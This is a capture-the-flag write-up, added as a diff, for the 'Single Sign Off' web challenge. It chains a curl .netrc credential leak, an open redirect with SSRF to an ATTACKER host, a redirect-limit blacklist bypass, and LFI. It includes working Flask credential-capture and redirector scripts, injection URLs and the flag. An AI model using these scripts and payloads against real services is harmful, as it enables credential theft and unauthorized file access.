@@ -1,0 +1,195 @@
+# Single Sign Off (125 pts - Web Exploitation)
+
+## Challenge Description
+
+> Our organization made a new Single Sign-On portal because we thought it would make everything easier. All our secrets are now locked away securely!
+
+**Author:** BlueKnight2345  
+**URL:** `https://single.chals.nitectf25.live/login`
+
+## TL;DR
+
+Multi-service exploit chain: CVE-2025-0167 (curl `.netrc` credential leak via open redirect + SSRF) → bypass IP blacklist using `CURLE_TOO_MANY_REDIRECTS` flaw → LFI to read PRNG-generated flag filename from `/proc/self/status`.
+
+## Architecture Overview
+
+The challenge spun up three internal services behind a single exposed `document-portal`:
+
+```
+[document-portal]  ←  public-facing, runs curl 7.80.0, uses .netrc
+[nite-sso]         ←  internal SSO, has /doLogin with open redirect
+[nite-vault]       ←  internal file store, blacklisted by document-portal
+```
+
+The goal was to read the flag file from **nite-vault**, which was both credentials-protected and IP-blacklisted.
+
+## Initial Analysis
+
+Extracting the provided `handout.zip` revealed the full source. Key findings:
+
+**1. `.netrc` credentials in Dockerfile:**
+
+```dockerfile
+echo 'machine nite-sso' >> /root/.netrc && \
+echo "  login niteuser" >> /root/.netrc && \
+echo "  password nitepass" >> /root/.netrc && \
+...
+echo 'default' >> /root/.netrc && \
+```
+
+The empty `default` entry is the critical vulnerability trigger.
+
+**2. `document-portal` runs curl 7.80.0** — vulnerable to **CVE-2025-0167**.
+
+**3. `nite-sso`'s `/doLogin` endpoint** allows open redirects via `redirect_url` parameter.
+
+**4. `nite-vault`'s `/view` endpoint** is vulnerable to LFI via the `file` parameter.
+
+**5. Flag filename is PRNG-generated** using `pid`, `uid`, `gid` as seed components.
+
+## Solution
+
+### Step 1: Understand CVE-2025-0167
+
+When curl's `.netrc` has an **empty `default` entry**, it leaks credentials for any machine via redirects. If `document-portal` fetches a URL and gets redirected, curl will attach the `nite-sso` credentials in a `Basic` auth header to the redirect destination — even if the destination is attacker-controlled.
+
+### Step 2: Steal nite-vault Credentials
+
+Set up two Flask servers:
+
+**`capture.py`** — waits for curl to send credentials via `Authorization: Basic` header:
+
+```python
+from flask import Flask, request
+import base64
+
+app = Flask(__name__)
+
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>')
+def capture_all(path):
+    auth = request.headers.get('Authorization')
+    if auth and auth.startswith('Basic '):
+        encoded = auth.split(' ')[1]
+        decoded = base64.b64decode(encoded).decode('utf-8')
+        print(f"[+] Credentials captured: {decoded}")
+        return f"credentials: {decoded}\n", 200
+    else:
+        # Must return 401 first to make libcurl attach credentials on retry
+        return "getting creds", 401, {
+            'WWW-Authenticate': 'Basic realm="Credential Capture"'
+        }
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5001)
+```
+
+Trigger it through `document-portal`'s fetch endpoint, routing via `nite%2Dsso`'s `doLogin` (URL-encoded to bypass blacklist):
+
+```
+/fetch → http://nite%2Dsso/doLogin?username=x&password=x&redirect_url=http://ATTACKER:5001/
+```
+
+Curl follows the redirect to our server, and the `.netrc` CVE causes it to attach `nite-sso`'s credentials → captured as `niteuser:nitepass`.
+
+### Step 3: Bypass the nite-vault Blacklist
+
+`document-portal` explicitly blocks requests to `nite-vault`. However, curl's `CURLE_TOO_MANY_REDIRECTS` error handling is flawed — after hitting the 5-redirect limit, curl **retries the final redirect without re-running security callbacks**.
+
+**`redirector.py`** — chains 6 redirects, with the final one pointing to `nite-vault`:
+
+```python
+from flask import Flask, redirect, request
+import sys
+
+app = Flask(__name__)
+REDIRECT_COUNT = 0
+MAX_REDIRECTS = 6
+TARGET = "http://nite-vault/view?file=/proc/self/status&username=niteuser&password=nitepass"
+
+@app.route('/')
+def redirector():
+    global REDIRECT_COUNT
+    REDIRECT_COUNT += 1
+    host = request.host
+    scheme = request.scheme
+    if REDIRECT_COUNT < MAX_REDIRECTS:
+        return redirect(f"{scheme}://{host}/", code=302)
+    else:
+        REDIRECT_COUNT = 0
+        return redirect(TARGET, code=302)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=int(sys.argv[1]) if len(sys.argv) > 1 else 5001)
+```
+
+The hostname `nite-vault` is double-encoded as `%6E%69%74%65%2D%76%61%75%6C%74` to survive URL parsing while bypassing Python's string filter.
+
+### Step 4: LFI to Read `/proc/self/status`
+
+With access to `nite-vault`, its `/view` endpoint is vulnerable to LFI:
+
+```
+/view?file=/proc/self/status&username=niteuser&password=nitepass
+```
+
+Response leaks:
+
+```
+Pid:   7
+Uid:   1000 1000 1000 1000
+Gid:   1000 1000 1000 1000
+```
+
+### Step 5: Brute-force the Flag Filename
+
+The flag filename is generated by `init_secret.py` using a SHA256-seeded PRNG:
+
+```python
+seed = int(f"{pid}{uid}{gid}")   # e.g. 710001000
+random.seed(seed)
+random_num = random.randint(100000, 999999)
+hash_part = hashlib.sha256(str(random_num).encode()).hexdigest()[:16]
+# flag stored at /app/nite-vault/secrets/{hash_part}.txt
+```
+
+With known `pid=7`, `uid=1000`, `gid=1000`, compute the filename locally:
+
+```python
+import hashlib, random
+
+seed = int("710001000")
+random.seed(seed)
+random_num = random.randint(100000, 999999)
+hash_part = hashlib.sha256(str(random_num).encode()).hexdigest()[:16]
+print(f"Flag file: /app/nite-vault/secrets/{hash_part}.txt")
+```
+
+### Step 6: Read the Flag
+
+Use the same redirect chain but point the final redirect at the computed flag path, with a `#` URL fragment appended to prevent session IDs from corrupting the `file` parameter:
+
+```
+/view?file=/app/%6E%69%74%65%2D%76%61%75%6C%74/secrets/{hash_part}.txt#
+```
+
+## Flag
+
+```
+nite{r3dir3ct_l3ak_r3p3at}
+```
+
+## Key Takeaways
+
+- **CVE-2025-0167** — curl `.netrc` with an empty `default` entry leaks credentials across redirects to unintended hosts
+- **`CURLE_TOO_MANY_REDIRECTS` bypass** — error handling that skips security callbacks on retry is a real curl flaw class
+- **URL fragment trick** — appending `#` prevents downstream query parameter corruption when chaining redirects
+- **PRNG filename bruteforce** — when filenames are seeded with deterministic values (pid/uid/gid), they can always be reconstructed from `/proc/self/status`
+- **Defense:** Pin credentials to exact hostnames, validate redirect destinations after every hop, and use cryptographically random filenames seeded from non-leakable sources
+
+## Tools Used
+
+- Python `flask` — malicious redirect and capture servers
+- `curl` — manual testing of redirect chains
+- `hashlib`, `random` — flag filename reconstruction
+- Docker — local environment reproduction from Dockerfile
